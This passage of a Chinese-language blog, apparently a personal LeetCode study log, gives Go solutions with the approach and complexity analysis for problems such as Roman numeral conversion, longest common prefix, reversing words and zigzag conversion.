class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">romanToInt</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="comment">// 首先建立map哈希表映射字符串</span></span><br><span class="line">    dic := <span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>&#123;</span><br><span class="line">        <span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;V&#x27;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&#x27;X&#x27;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&#x27;L&#x27;</span>: <span class="number">50</span>,</span><br><span class="line">        <span class="string">&#x27;C&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">        <span class="string">&#x27;D&#x27;</span>: <span class="number">500</span>,</span><br><span class="line">        <span class="string">&#x27;M&#x27;</span>: <span class="number">1000</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    n := <span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对字符串从左到右处理</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        <span class="comment">// 如果第i个字符小于第i+1个字符，则减去第i个字符</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; n<span class="number">-1</span> &amp;&amp; dic[s[i]] &lt; dic[s[i+<span class="number">1</span>]] &#123;</span><br><span class="line">            ans -= dic[s[i]]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 否则，加上第i个字符</span></span><br><span class="line">            ans += dic[s[i]]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="12整数转罗马数字"><a class="markdownIt-Anchor" href="#12整数转罗马数字"></a> 12.整数转罗马数字</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/integer-to-roman/description/">12. 整数转罗马数字</a></p></blockquote><h2 id="思路-18"><a class="markdownIt-Anchor" href="#思路-18"></a> 思路</h2><p>暴力打表，同时运用贪心的算法尽可能的多匹配字符串。</p><h2 id="解题方法-18"><a class="markdownIt-Anchor" href="#解题方法-18"></a> 解题方法</h2><p>建立起数字映射表，然后从最大的数字开始匹配，并输出转换后的字符串</p><h2 id="复杂度-18"><a class="markdownIt-Anchor" href="#复杂度-18"></a> 复杂度</h2><p>时间复杂度：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，因为虽然有循环，但是循环次数是固定的，与输入大小无关。</p><p>空间复杂度：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，只使用了固定大小的额外空间</p><h2 id="code-17"><a class="markdownIt-Anchor" href="#code-17"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intToRoman</span><span class="params">(num <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="comment">// 建立罗马数字映射表</span></span><br><span class="line">    val := []<span class="type">int</span>&#123;<span class="number">1000</span>, <span class="number">900</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">100</span>, <span class="number">90</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>&#125;</span><br><span class="line">    syms := []<span class="type">string</span>&#123;<span class="string">&quot;M&quot;</span>, <span class="string">&quot;CM&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;CD&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;XC&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;XL&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;IX&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;IV&quot;</span>, <span class="string">&quot;I&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    roman := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从大到小遍历映射表</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(val); i++ &#123;</span><br><span class="line">        <span class="comment">// 对于每个罗马数字，尽可能多地匹配</span></span><br><span class="line">        <span class="keyword">for</span> num &gt;= val[i] &#123;</span><br><span class="line">            num -= val[i]</span><br><span class="line">            roman += syms[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> roman</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="58最后一个单词的长度"><a class="markdownIt-Anchor" href="#58最后一个单词的长度"></a> 58.最后一个单词的长度</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/length-of-last-word/description/">58. 最后一个单词的长度</a></p></blockquote><h2 id="思路-19"><a class="markdownIt-Anchor" href="#思路-19"></a> 思路</h2><p>直接调包，用strings.Split函数切割字符串，再打印最后一个单词的长度。</p><h2 id="解题方法-19"><a class="markdownIt-Anchor" href="#解题方法-19"></a> 解题方法</h2><p>用Split分隔后，从最后一项开始寻找非空字符串，然后返回长度。</p><h2 id="复杂度-19"><a class="markdownIt-Anchor" href="#复杂度-19"></a> 复杂度</h2><p>时间复杂度:</p><p>Split函数复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，故时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>空间复杂度:</p><p>创建了一个原字符串大小的切片，故空间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><h2 id="code-18"><a class="markdownIt-Anchor" href="#code-18"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lengthOfLastWord</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    slice:=strings.Split(s,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i:= <span class="built_in">len</span>(slice)<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--&#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(slice[i])==<span class="number">0</span>&#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(slice[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="comment">//    return len(slice[len(slice)-1])</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="14最长公共前缀"><a class="markdownIt-Anchor" href="#14最长公共前缀"></a> 14.最长公共前缀</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/longest-common-prefix/description/">14. 最长公共前缀</a></p></blockquote><h2 id="思路-20"><a class="markdownIt-Anchor" href="#思路-20"></a> 思路</h2><p>思路有很多，可以横向搜索，也可以纵向搜索。这里我用的是纵向搜索。</p><h2 id="解题方法-20"><a class="markdownIt-Anchor" href="#解题方法-20"></a> 解题方法</h2><p>搜索每一个字符串中的第i个字符是否相等，如果不相等或者i等于某个子串的长度，查找结束，返回字符串即最长公共前缀。</p><h2 id="复杂度-20"><a class="markdownIt-Anchor" href="#复杂度-20"></a> 复杂度</h2><p>时间复杂度:</p><p>时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(mn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，m是最长公共前缀的长度，n是字符串的个数。</p><p>空间复杂度:</p><p>空间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，没有使用额外空间。</p><h2 id="code-19"><a class="markdownIt-Anchor" href="#code-19"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">longestCommonPrefix</span><span class="params">(strs []<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(strs) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="built_in">len</span>(strs[<span class="number">0</span>]);i++&#123;</span><br><span class="line">        <span class="keyword">for</span> j:=<span class="number">0</span>;j&lt;<span class="built_in">len</span>(strs);j++&#123;</span><br><span class="line">            <span class="keyword">if</span> i==<span class="built_in">len</span>(strs[j])||strs[j][i]!=strs[<span class="number">0</span>][i]&#123;</span><br><span class="line">                <span class="keyword">return</span> strs[<span class="number">0</span>][:i]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> strs[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="151反转字符串中的单词"><a class="markdownIt-Anchor" href="#151反转字符串中的单词"></a> 151.反转字符串中的单词</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/reverse-words-in-a-string/description/">151. 反转字符串中的单词</a></p></blockquote><h2 id="思路-21"><a class="markdownIt-Anchor" href="#思路-21"></a> 思路</h2><p>灵活调包，用strings包下的Split和Join函数处理。</p><h2 id="解题方法-21"><a class="markdownIt-Anchor" href="#解题方法-21"></a> 解题方法</h2><p>首先用Split函数把字符串以空格为间隙切割成字符切片，然后从后往前遍历所有长度不为0的元素，倒序添加进新的切片并加上一个空格。</p><p>记住循环结束后要弹出结尾的空格。最后用Join函数合并字符切片转为字符串即可。</p><h2 id="复杂度-21"><a class="markdownIt-Anchor" href="#复杂度-21"></a> 复杂度</h2><p>时间复杂度:</p><p>Split函数的操作时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，故时间复杂度应为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>空间复杂度:</p><p>创建了一个切片储存倒序字符串，故空间复杂度应为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><h2 id="code-20"><a class="markdownIt-Anchor" href="#code-20"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseWords</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    split:=strings.Split(s,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    ans:=<span class="built_in">make</span>([]<span class="type">string</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="built_in">len</span>(split)<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--&#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(split[i])!=<span class="number">0</span>&#123;</span><br><span class="line">            ans=<span class="built_in">append</span>(ans,split[i])</span><br><span class="line">            ans=<span class="built_in">append</span>(ans,<span class="string">&quot; &quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans=ans[:<span class="built_in">len</span>(ans)<span class="number">-1</span>] <span class="comment">//弹出最后一个空格</span></span><br><span class="line">    <span class="keyword">return</span> strings.Join(ans,<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6z字形变换"><a class="markdownIt-Anchor" href="#6z字形变换"></a> 6.Z字形变换</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/zigzag-conversion/description/">6. Z 字形变换</a></p></blockquote><h2 id="思路-22"><a class="markdownIt-Anchor" href="#思路-22"></a> 思路</h2><p>这题与其说是Z字形变换，倒不如说是N字形……</p><p>可以通过模拟字符串的方式解决，即通过变换规律推导出结果矩阵，依次填充后再输出矩阵为字符串。同时，还可以通过压缩矩阵的方式降低空间复杂度。</p><p>但我们还可以通过推导规律直接写出矩阵对应id对应的字符串。</p><h2 id="解题方法-22"><a class="markdownIt-Anchor" href="#解题方法-22"></a> 解题方法</h2><p>观察矩阵：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0             0+t                    0+2t                     0+3t</span><br><span class="line">1      t-1    1+t            0+2t-1  1+2t            0+3t-1   1+3t</span><br><span class="line">2  t-2        2+t  0+2t-2            2+2t  0+3t-2             2+3t  </span><br><span class="line">3             3+t                    3+2t                     3+3t</span><br></pre></td></tr></table></figure><p>设矩阵的字符位置为idx，对应字符串s的位置为i。则不难发现规律：</p><ol><li>矩阵变换周期为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>=</mo><mn>2</mn><mo separator="true">⋅</mo><mi>r</mi><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">t=2·r-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span></li><li>对矩阵第一行，只对应一个元素：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mi>x</mi><mo>≡</mo><mn>0</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>t</mi></mrow><annotation encoding="application/x-tex">idx \equiv 0 \bmod t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span></li><li>对矩阵最后一行，也只对应一个元素：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mi>x</mi><mo>≡</mo><mi>r</mi><mo>−</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>t</mi></mrow><annotation encoding="application/x-tex">idx \equiv r-1 \bmod t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span></li><li>对其余<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>行，对应两个元素：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mi>x</mi><mo>≡</mo><mi>i</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>t</mi></mrow><annotation encoding="application/x-tex">idx \equiv i \bmod t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mi>x</mi><mo>≡</mo><mi>t</mi><mo>−</mo><mi>i</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>t</mi></mrow><annotation encoding="application/x-tex">idx \equiv t-i \bmod t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span></li></ol><p>故可直接构造代码。</p><h3 id="复杂度-22"><a class="markdownIt-Anchor" href="#复杂度-22"></a> 复杂度</h3><p>时间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，其中n为字符串s的长度。s中的每个字符仅会被访问一次，因此时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>空间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，返回值不计入空间复杂度。</p><h2 id="code-21"><a class="markdownIt-Anchor" href="#code-21"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">convert</span><span class="params">(s <span class="type">string</span>, numRows <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    n,r:=<span class="built_in">len</span>(s),numRows</span><br><span class="line">    <span class="keyword">if</span> r==<span class="number">1</span>||r&gt;=n&#123;</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    &#125;</span><br><span class="line">    t:=<span class="number">2</span>*r<span class="number">-2</span></span><br><span class="line">    ans:=<span class="built_in">make</span>([]<span class="type">byte</span>,<span class="number">0</span>,n)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;r;i++&#123;</span><br><span class="line">        <span class="keyword">for</span> j:=<span class="number">0</span>;j+i&lt;n;j+=t&#123;</span><br><span class="line">            ans=<span class="built_in">append</span>(ans,s[i+j])</span><br><span class="line">            <span class="keyword">if</span> i&gt;<span class="number">0</span> &amp;&amp; i&lt;r<span class="number">-1</span> &amp;&amp; t-i+j&lt;n &#123;</span><br><span class="line">                ans=<span class="built_in">append</span>(ans,s[t-i+j])</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(ans)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="28找出字符串中第一个匹配项的下标"><a class="markdownIt-Anchor" href="#28找出字符串中第一个匹配项的下标"></a> 28.找出字符串中第一个匹配项的下标</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/description/">28. 找出字符串中第一个匹配项的下标</a></p></blockquote><h2 id="思路-23"><a class="markdownIt-Anchor" href="#思路-23"></a> 思路</h2><p>本来以为是KMP字符串匹配算法，结果是简单题？？？那就直接用内置的语言库秒了。</p><p>不过有点恶心的是，我们数据结构和算法设计都没有讲过KMP，我还得自学一遍……也许某天我会专门出一篇讲解KMP算法的博客吧。目前可以参考力扣官方的题解当代餐：<a href="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/solutions/732236/shi-xian-strstr-by-leetcode-solution-ds6y/?envType=study-plan-v2&amp;envId=top-interview-150">实现 strStr()</a></p><h2 id="解题方法-23"><a class="markdownIt-Anchor" href="#解题方法-23"></a> 解题方法</h2><p>直接调库strings.Index()函数。</p><h2 id="复杂度-23"><a class="markdownIt-Anchor" href="#复杂度-23"></a> 复杂度</h2><p>时间复杂度:</p><p>Golang中 substr长度大于64/32(视CPU的情况而定)的情况，</p><p>查找采用的rabin-karp算法，它是由Richard M. Karp和 Michael O. Rabin在1987年提出的。它的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo 